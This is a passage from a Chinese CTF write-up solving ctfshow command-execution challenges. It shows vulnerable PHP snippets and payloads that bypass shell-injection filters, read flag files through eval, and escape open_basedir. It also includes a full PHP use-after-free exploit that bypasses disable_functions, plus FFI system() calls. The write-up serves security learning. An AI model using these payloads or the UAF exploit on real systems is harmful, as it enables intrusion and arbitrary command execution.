cd /var && ls\nbackups  cache  crash  lib  local  lock  log  mail  opt  run  snap  spool  tmp  www\n```\n\n`逻辑与`符：前面的命令执行成功，才会执行后面的命令，前面的命令执行失败，后面的命令不会执行\n\n### Linux命令连接符||\n\n```php\nroot@VM-16-12-ubuntu:/var# cd /v || ls\nbash: cd: /v: No such file or directory\nbackups  cache  crash  lib  local  lock  log  mail  opt  run  snap  spool  tmp  www\nroot@VM-16-12-ubuntu:/var# cd /var || ls\n```\n\n`逻辑或`符：前面的命令执行成功，则后面的命令不会执行。前面的命令执行失败，后面的命令才会执行。\n\n### Linux命令连接符|\n\n```php\nroot@VM-16-12-ubuntu:/var# echo 'cd /' | bash -i\nroot@VM-16-12-ubuntu:/var# cd /\nroot@VM-16-12-ubuntu:/# exit\n```\n\n管道符，当用此连接符连接多个命令时，前面命令执行的正确输出，会交给后面的命令继续处理。若前面的命令执行失败，则会报错，若后面的命令无法处理前面命令的输出，也会报错。\n\n所以这里用连接符直接打\n\n```php\n?c=ls%26%26ls//ls&&ls\n```\n\n这里&是用于在URL中分隔查询参数的\n\n## web44\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-05 20:49:30\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-05 21:32:01\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    if(!preg_match(\"/;|cat|flag/i\", $c)){\n        system($c.\" >/dev/null 2>&1\");\n    }\n}else{\n    highlight_file(__FILE__);\n}\n```\n\n多过滤了一个flag\n\n```php\n?c=tac fla\\g.php%26%26ls\n```\n\nflag绕过之前就做过了\n\n## web45\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-05 20:49:30\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-05 21:35:34\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    if(!preg_match(\"/\\;|cat|flag| /i\", $c)){\n        system($c.\" >/dev/null 2>&1\");\n    }\n}else{\n    highlight_file(__FILE__);\n}\n```\n\n多过滤了空格，也是之前学过的\n\n```php\n?c=tac${IFS}fla*||ls\n```\n\n## web46\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-05 20:49:30\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-05 21:50:19\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*/i\", $c)){\n        system($c.\" >/dev/null 2>&1\");\n    }\n}else{\n    highlight_file(__FILE__);\n}\n```\n\n多过滤了数字和dollar符号以及`*`号，那空格可以用重定向符，URL编码去绕过\n\n```php\n?c=tac<fla''g.php||ls\n?c=tac%09fla''g.php||ls\n```\n\n## web47\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-05 20:49:30\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-05 21:59:23\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i\", $c)){\n        system($c.\" >/dev/null 2>&1\");\n    }\n}else{\n    highlight_file(__FILE__);\n}\n```\n\n过滤了很多读取文件的函数，可以用`tac`、`nl`和`awk`\n\n```php\n?c=tac%09fla?.php||ls\n```\n\n## web48\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-05 20:49:30\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-05 22:06:20\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i\", $c)){\n        system($c.\" >/dev/null 2>&1\");\n    }\n}else{\n    highlight_file(__FILE__);\n}\n```\n\n还是没过滤nl和tac\n\n```php\n?c=nl%09fla?.php||\n```\n\n文件内容在源码中\n\n## web49\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-05 20:49:30\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-05 22:22:43\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i\", $c)){\n        system($c.\" >/dev/null 2>&1\");\n    }\n}else{\n    highlight_file(__FILE__);\n}\n```\n\n不用管过滤了百分号，因为%09是URL编码，在传入到服务器的时候会进行URL解码为Tab符\n\n```php\n?c=tac%09fla?.php||\n```\n\n## web50\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-05 20:49:30\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-05 22:32:47\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\", $c)){\n        system($c.\" >/dev/null 2>&1\");\n    }\n}else{\n    highlight_file(__FILE__);\n}\n```\n\n过滤了09，可以用重定向符\n\n```php\n?c=tac<fla''g.php||\n```\n\n## web51\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-05 20:49:30\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-05 22:42:52\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\", $c)){\n        system($c.\" >/dev/null 2>&1\");\n    }\n}else{\n    highlight_file(__FILE__);\n}\n```\n\n过滤了tac，nl还能用\n\n```php\n?c=nl<fla\"\"g.php||\n```\n\n## web52\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-05 20:49:30\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-05 22:50:30\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\>|\\</i\", $c)){\n        system($c.\" >/dev/null 2>&1\");\n    }\n}else{\n    highlight_file(__FILE__);\n}\n```\n\n这次把重定向符都过滤了，但是把dollar放出来了\n\n```php\n?c=nl${IFS}/fla\"\"g||\n```\n\n好像flag在根目录而不是在当前目录？我前面用nl的题目没看flag是不是在flag.php，大家可以看一下\n\n## web53\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-05 20:49:30\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-07 18:21:02\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\>|\\</i\", $c)){\n        echo($c);\n        $d = system($c);\n        echo \"<br>\".$d;\n    }else{\n        echo 'no';\n    }\n}else{\n    highlight_file(__FILE__);\n}\n```\n\nflag在flag.php中\n\n```php\n?c=nl${IFS}fla\"\"g.php\n```\n\n## web54\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: Lazzaro\n# @Date:   2020-09-05 20:49:30\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-07 19:43:42\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    if(!preg_match(\"/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\>|\\</i\", $c)){\n        system($c);\n    }\n}else{\n    highlight_file(__FILE__);\n}\n```\n\n其实就是完全过滤了这些字符，那就不能绕过了，可使用未过滤的uniq，grep进行查找，也可以使用mv或者cp对文件重命名进行访问\n\n更骚的姿势就是用文件执行命令去打\n\n`/bin`这个目录下一些命令文件\n\n```php\n?c=/bin/ca?${IFS}f???????\n?c=/bin/base??${IFS}f???????\n```\n\n但是不知道为什么我写成\n\n```php\n?c=/bin/base??${IFS}fla?????\n```\n\n就不行\n\n## web55\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: Lazzaro\n# @Date:   2020-09-05 20:49:30\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-07 20:03:51\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n// 你们在炫技吗？\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    if(!preg_match(\"/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\>|\\</i\", $c)){\n        system($c);\n    }\n}else{\n    highlight_file(__FILE__);\n}\n```\n\n无字母RCE，用bin目录下的base64就行\n\n```php\n?c=/???/????64 ????.???\n```\n\n当然也可以用`/usr/bin/bzip2`，这个会将文件进行压缩，然后我们访问flag.php.bz2就可以把flag.php下载下来\n\n```php\n?c=/???/???/????2 ????.???\n```\n\n不过也可以打无数字字母RCE中的临时文件上传bash脚本并用`.`执行，因为在system中不能进行异或/拼接等操作\n\n## web56\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: Lazzaro\n# @Date:   2020-09-05 20:49:30\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-07 22:02:47\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n// 你们在炫技吗？\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    if(!preg_match(\"/\\;|[a-z]|[0-9]|\\\\$|\\(|\\{|\\'|\\\"|\\`|\\%|\\x09|\\x26|\\>|\\</i\", $c)){\n        system($c);\n    }\n}else{\n    highlight_file(__FILE__);\n}\n```\n\n过滤太多懒得看了，输出可用字符\n\n```php\n ! # ) * + , - . / : = ? @ [ \\ ] ^ _ | } ~ \n```\n\n这个就是无数字字母中的了，可以参考P牛的文章https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html\n\n## web57\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-05 20:49:30\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-08 01:02:56\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n*/\n\n// 还能炫的动吗？\n//flag in 36.php\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    if(!preg_match(\"/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\'|\\\"|\\`|\\%|\\x09|\\x26|\\x0a|\\>|\\<|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i\", $c)){\n        system(\"cat \".$c.\".php\");\n    }\n}else{\n    highlight_file(__FILE__);\n}\n```\n\n这里的话很明显是需要构造一个36出来\n\n**在linux中**，`$(())`表示进行运算的意思\n\n```\nroot@VM-16-12-ubuntu:/home/ubuntu# echo $(())\n0\nroot@VM-16-12-ubuntu:/home/ubuntu# echo $((~$(())))\n-1\nroot@VM-16-12-ubuntu:/home/ubuntu# echo $(($((~$(())))$((~$(())))$((~$(())))))\n-3\nroot@VM-16-12-ubuntu:/home/ubuntu# echo $((~$(($((~$(())))$((~$(())))$((~$(())))))))\n2\n```\n\n中间37个`$((~$(())))`就是`-37`，取反后就是`36`\n\n```php\nroot@VM-16-12-ubuntu:/home/ubuntu# echo $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\n36\n```\n\n所以我们的payload\n\n```php\n?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\n```\n\n## web58-65\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: Lazzaro\n# @Date:   2020-09-05 20:49:30\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-07 22:02:47\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n// 你们在炫技吗？\nif(isset($_POST['c'])){\n        $c= $_POST['c'];\n        eval($c);\n}else{\n    highlight_file(__FILE__);\n}\n```\n\n这里的话是有disable_function禁用函数的，我发现可以用file_put_contents写文件但是写入的函数还是会被禁用\n\n可以用原生类去读一下目录\n\n```php\nc=$a=new DirectoryIterator('./');foreach($a as $f){echo($f->__toString().\" \");}\n```\n\n然后用读文件的函数去读\n\n```php\nc=echo file_get_contents('flag.php');\n\nc=echo highlight_file('flag.php');\nc=highlight_file(\"flag.php\");\n\nc=show_source('flag.php');\n```\n\n当然这里也可以用无参数RCE去读目录和文件\n\n```php\nc=print_r(scandir(current(localeconv())));\nc=highlight_file(next(array_reverse(scandir(current(localeconv())))));\n```\n\n## web66-67\n\n这次flag不在flag.php中，那看看根目录\n\n```php\nc=print_r(scandir('/'));\n```\n\n```php\nArray ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => dev [5] => etc [6] => flag.txt [7] => home [8] => lib [9] => media [10] => mnt [11] => opt [12] => proc [13] => root [14] => run [15] => sbin [16] => srv [17] => sys [18] => tmp [19] => usr [20] => var )\n```\n\n现在问题是如何读到非第一第二位的flag.txt呢？先看看读文件的函数能不能直接读\n\n```php\nc=highlight_file('/flag.txt');\n```\n\n发现可以读，直接拿到了\n\n## web68\n\n### #输出数组函数代替1\n\nprint_r()函数被禁用，可以用var_dump()函数\n\n```php\nc=var_dump(scandir('/'));\n```\n\n然后发现读文件的函数都用不了了，但是可以用原生类去读文件\n\n```php\nc=var_dump((new SplFileObject('/flag.txt'))->fpassthru());\n```\n\n这里的话就是用SplFileObject类去读文件的\n\n## web69-70\n\n### #输出数组函数代替2\n\n这道题的话var_dump()函数也被禁用了，那找找其他的函数，只要是可以输出数组或者操作数组的就行\n\n### json_encode()函数\n\n```php\nc=echo json_encode(scandir(\"/\"));\n```\n\n这里的话可以将数组转化成json的格式，然后用echo去输出\n\n### var_export()函数\n\n```php\nc=var_export(scandir(\"/\"));\n```\n\n![image-20250703151616322](../image/achieve/202411/命令执行--ctfshow/image-20250703151616322.png)\n\n然后看到flag，尝试读取\n\n```php\nc=var_export((new SplFileObject('/flag.txt'))->fpassthru());\n```\n\n## web71\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: Lazzaro\n# @Date:   2020-09-05 20:49:30\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-07 22:02:47\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\nerror_reporting(0);\nini_set('display_errors', 0);\n// 你们在炫技吗？\nif(isset($_POST['c'])){\n        $c= $_POST['c'];\n        eval($c);\n        $s = ob_get_contents();\n        ob_end_clean();\n        echo preg_replace(\"/[0-9]|[a-z]/i\",\"?\",$s);\n}else{\n    highlight_file(__FILE__);\n}\n\n?>\n\n你要上天吗？\n```\n\n这里的话是一个缓冲区的绕过，可以提前送出缓冲区也可以直接绕过缓冲区\n\n### 提前送出缓冲区\n\n```php\n可用的函数:\n1.ob_flush()函数\nob_flush() 函数在 PHP 中用于刷新（输出）当前输出缓冲区的内容。当输出缓冲被激活时（通常通过 ob_start() 函数），PHP 脚本的输出不会立即发送到客户端（如浏览器），而是先存储在内部缓冲区中。ob_flush() 函数会将缓冲区的内容发送到客户端，但不一定清空缓冲区本身，这取决于 PHP 的配置和输出缓冲机制的状态。\n\n2.flush()函数\nflush() 函数尝试将输出缓冲区的内容发送到客户端。但是，如果 PHP 的输出缓冲和 Web 服务器的输出缓冲同时被激活，flush() 可能不会清空 PHP 的输出缓冲区，只会尝试清空 Web 服务器的输出缓冲区。\nob_flush() 函数确保 PHP 的输出缓冲区内容被发送到客户端。如果同时调用了 flush()，则可能尝试同时清空 PHP 和 Web 服务器的输出缓冲区。\n    \n3.ob_end_flush()函数\nob_end_flush(); 函数在 PHP 中用于结束当前的输出缓冲区，并将缓冲区的内容发送到客户端（如浏览器）。这个函数结合了 ob_end_clean(); 和 ob_flush(); 的功能：它首先会发送缓冲区的内容（如果缓冲区不为空），然后关闭（结束）当前的输出缓冲块。\n\n与 ob_end_clean() 的区别：\nob_end_clean(); 只是清空（丢弃）缓冲区的内容，并不发送它到客户端。\nob_end_flush(); 则会发送内容，并结束缓冲。\n    \n与 ob_flush() 的区别：\nob_flush(); 只会发送缓冲区的内容到客户端，但不会结束缓冲块。这意味着缓冲区仍然存在，之后的输出仍然可以被添加到这个缓冲区中（直到另一个 ob_end_... 函数被调用）。\n```\n\ntest\n\n```php\nc=echo '1';ob_flush();\n```\n\n### 绕过缓冲区\n\n如果是绕过缓冲区的话，用exit或者die函数提前结束代码就行了\n\ntest\n\n```php\nc=echo '1';exit();\n```\n\n所以我们的payload\n\n```php\nc=var_export((new SplFileObject('/flag.txt'))->fpassthru());exit();\nc=var_export((new SplFileObject('/flag.txt'))->fpassthru());ob_flush();\n```\n\n## web72\n\n### #glob协议绕过目录访问限制\n\nopen_basedir 是 PHP 的一个安全配置指令，由于 open_basedir 限制 PHP 脚本只能访问特定的目录。当前配置只允许访问 /var/www/html/ 目录及其子目录，但不允许访问其他目录。\n\n这里可以用glob伪协议，此协议筛选目录不受open_basedir的制约\n\nglob协议可以用在原生类中\n\n```php\nc=$a=new DirectoryIterator('glob:///*');foreach($a as $A){echo $A.'<br>';};exit();\n```\n\n也可以直接用在scandir函数中\n\n```php\nc=var_export(scandir('glob:///*'));exit();\n```\n\n然后怎么读文件呢？这里就要用到UAF脚本了\n\n### UAF脚本\n\nUAF（Use After Free）漏洞的脚本通常涉及对已经被释放的内存块（堆块）的非法访问或操作。这种漏洞常常发生在编程中，当程序释放了一个内存块后，没有正确地将其指针置为空（NULL）或进行其他形式的清理，导致后续代码仍然可以通过该指针访问已经释放的内存区域。\n\n在编写UAF漏洞的利用脚本时，攻击者通常会尝试执行以下步骤：\n\n1. **申请内存块**：首先，攻击者会通过合法的手段（如malloc、new等）申请一个或多个内存块。\n2. **释放内存块**：接着，攻击者会释放其中一个或多个内存块，但故意不将相关的指针置为空。\n3. **利用未置空的指针**：在内存块被释放后，攻击者会尝试通过之前未置空的指针来访问或修改这块已经释放的内存区域。由于这块内存可能已经被重新分配给其他用途，因此这种访问或修改可能会导致不可预测的行为，包括信息泄露、任意代码执行等。\n4. **实现攻击目标**：通过精心构造的输入或操作，攻击者可以利用UAF漏洞实现各种攻击目标，如获取敏感信息、提升权限、执行任意代码等。\n\n所以我们的payload\n\n```php\nc=?><?php\npwn(\"ls /;cat /flag0.txt\");\n\nfunction pwn($cmd) {\n    global $abc, $helper, $backtrace;\n    class Vuln {\n        public $a;\n        public function __destruct() { \n            global $backtrace; \n            unset($this->a);\n            $backtrace = (new Exception)->getTrace(); # ;)\n            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4\n                $backtrace = debug_backtrace();\n            }\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= sprintf('%c',$ptr & 0xff);\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = sprintf('%c',$v & 0xff);\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) { # system\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    function trigger_uaf($arg) {\n        # str_shuffle prevents opcache string interning\n        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\n        $vuln = new Vuln();\n        $vuln->a = $arg;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; # increase this value if UAF fails\n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\n\n    trigger_uaf('x');\n    $abc = $backtrace[1]['args'][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    # leaks\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    # fake value\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    # fake reference\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n    # fake closure object\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    # pwn\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); # internal func type\n    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler\n\n    ($helper->b)($cmd);\n    exit();\n}\n```\n\nURL编码后传入就可以了\n\n## web73\n\n没有了open_basedir的限制，那我们尝试正常的读文件\n\n```php\nc=var_export(scandir('/'));exit();\n```\n\n找到一个flagc.txt\n\n```php\nc=var_export((new SplFileObject('/flagc.txt'))->fpassthru());ob_flush();\n```\n\n## web74\n\n这次用73的读目录发现读不出来，回显是null，应该是scandir用不了，换成其他函数试一下发现opendir也不行，用原生类看看\n\n```php\nc=$A=new DirectoryIterator('/');foreach($A as $a){echo $a.'<br>';};exit();\n```\n\n可以读那就直接用原生类读文件\n\n```php\nc=var_export((new SplFileObject('/flagx.txt'))->fpassthru());exit();\n```\n\n## web75-76\n\n又有目录访问限制，还是用glob协议去解决\n\n```php\nc=$A=new DirectoryIterator('glob:///*');foreach($A as $a){echo $a.'<br>';};exit();\n```\n\n但是怎么读文件呢？\n\n```php\nc=try {\n    $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root',\n'root');\n    foreach($dbh->query('select load_file(\"/flag36.txt\")') as $row)\n    {\n        echo($row[0]).\"|\"; \n    }\n    $dbh = null;\n}catch (PDOException $e) {\n    echo $e->getMessage();\n    exit(0);\n}\nexit(0);\n```\n\n这里的话是用mysql的load_file()函数去读文件的，但是前提是需要开启mysql服务\n\n## web77\n\n提示php7.4，这道题的话可以用FFI，也就是外部函数调用机制，https://www.php.net/manual/zh/book.ffi.php在PHP7.4以上的版本可以让你在 PHP 里调用 C 代码以及C函数\n\n一开始是读的txt文件\n\n```php\nc=$ffi = FFI::cdef(\"int system(const char *command);\");$a='cat /flag36x.txt > 2.txt';$ffi->system($a);exit();\n```\n\n但是发现是空的\n\n执行一下readflag程序\n\n```php\nc=$ffi = FFI::cdef(\"int system(const char *command);\");$a='/readflag > 1.txt';$ffi->system($a);exit();\n```\n\n解释一下:\n\n- `$ffi = FFI::cdef(\"int system(const char *command);\"); `//创建一个system对象\n- `$a='/readflag > 1.txt';` //无回显RCE\n- `$ffi->system($a);` //通过$ffi去调用system函数\n\n## web118\n\n### #内置环境变量RCE\n\n在源码中发现提示\n\n```php\n<!-- system($code);-->\n```\n\n所以这里是命令执行，我们先测一下过滤，`dollar`，`~`，然后大写字母没被过滤，可以用Linux内置环境变量，但是这里不能用echo输出环境变量，我们得在本地测\n\n```php\nubuntu@VM-16-12-ubuntu:/var/www/html$ echo ${PWD}\n/var/www/html\nubuntu@VM-16-12-ubuntu:/var/www/html$ echo ${PATH}\n/home/ubuntu/.nvm/versions/node/v22.14.0/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\n```\n\n这两个环境变量的话跟题目大概率是一样的，看看能不能用这个去拼接一下\n\n```php\nubuntu@VM-16-12-ubuntu:/var/www/html$ echo ${PWD:~A}\nl\nubuntu@VM-16-12-ubuntu:/var/www/html$ echo ${PATH:~A}\nn\n```\n\n拼接出nl，看看能不能执行\n\n```php\nubuntu@VM-16-12-ubuntu:/var/www/html$ ${PATH:~A}${PWD:~A} 